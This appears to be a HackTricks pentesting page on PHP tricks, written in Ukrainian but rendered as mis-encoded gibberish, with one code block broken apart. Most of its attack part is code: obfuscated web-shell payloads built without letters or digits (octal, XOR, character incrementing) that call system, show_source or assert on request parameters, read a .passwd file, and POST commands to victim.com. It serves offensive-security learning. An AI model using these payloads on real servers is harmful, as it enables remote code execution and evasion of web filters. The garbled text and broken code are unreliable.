–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **web**[ **www.unphp.net**](http://www.unphp.net) **–¥–ª—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó php-–∫–æ–¥—É.**

## PHP –æ–±–≥–æ—Ä—Ç–∫–∏ —Ç–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏

PHP –æ–±–≥–æ—Ä—Ç–∫–∏ —Ç–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç–∏ –Ω–∞ –∑–∞–ø–∏—Å —ñ —á–∏—Ç–∞–Ω–Ω—è** –≤ —Å–∏—Å—Ç–µ–º—ñ —Ç–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —ó—ó. –î–ª—è [**–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π RCE

–Ø–∫—â–æ –≤–∏ –±–∞—á–∏—Ç–µ, —â–æ **Xdebug** **—É–≤—ñ–º–∫–Ω–µ–Ω–æ** –≤ `phpconfig()` –≤–∏–≤–æ–¥—ñ, –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE —á–µ—Ä–µ–∑ [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## –ó–º—ñ–Ω–Ω—ñ –∑–º—ñ–Ω–Ω–∏—Ö
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –Ω–æ–≤–∏–º $\_GET\["a"]\($\_GET\["b")

–Ø–∫—â–æ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –æ–±'—î–∫—Ç –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–ª–∞—Å—É**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —è–∫:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## –í–∏–∫–æ–Ω–∞–Ω–Ω—è PHP –±–µ–∑ –ª—ñ—Ç–µ—Ä

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–æ—Å—å–∫–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR easy shell code

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü—ñ—î—é —Å—Ç–∞—Ç—Ç–µ—é**](https://mgp25.com/ctf/Web-challenge/) –º–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –ø—Ä–æ—Å—Ç–∏–π shellcode —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
–û—Ç–∂–µ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π PHP –±–µ–∑ —Ü–∏—Ñ—Ä —ñ –ª—ñ—Ç–µ—Ä**, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ —Ü–∏–º –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl –ø–æ–¥—ñ–±–Ω–∏–π
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
